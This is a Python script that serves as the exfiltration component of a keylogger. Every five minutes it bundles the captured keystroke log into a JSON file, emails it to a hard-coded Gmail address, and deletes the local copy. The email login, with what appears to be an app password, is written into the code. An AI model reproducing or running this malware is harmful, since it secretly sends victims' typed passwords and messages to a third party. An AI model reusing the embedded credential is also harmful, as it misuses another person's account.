import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import json
import schedule
import time
import os

# Email configuration
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
USERNAME = 'sushanshetty1470@gmail.com'
PASSWORD = 'xxgpcamappvlxxxy'
TO_EMAIL = 'sushanshetty1470@gmail.com'

log_file = "keylogger.json"


def create_json_file():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{timestamp}.json"
    if os.path.exists(log_file):
        with open(log_file, 'r') as file:
            data = json.load(file)
        with open(filename, 'w') as file:
            json.dump(data, file, indent=4)
    else:
        with open(filename, 'w') as file:
            json.dump({}, file, indent=4)
    return filename


def send_email(filename):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f"Keylogger Data - {filename}"
        msg['From'] = USERNAME
        msg['To'] = TO_EMAIL

        with open(filename, 'rb') as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(part)

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(USERNAME, PASSWORD)
            server.sendmail(USERNAME, TO_EMAIL, msg.as_string())
            print(f"Email with {filename} sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")


def job():
    filename = create_json_file()
    send_email(filename)
    os.remove(filename)


schedule.every(5).minutes.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
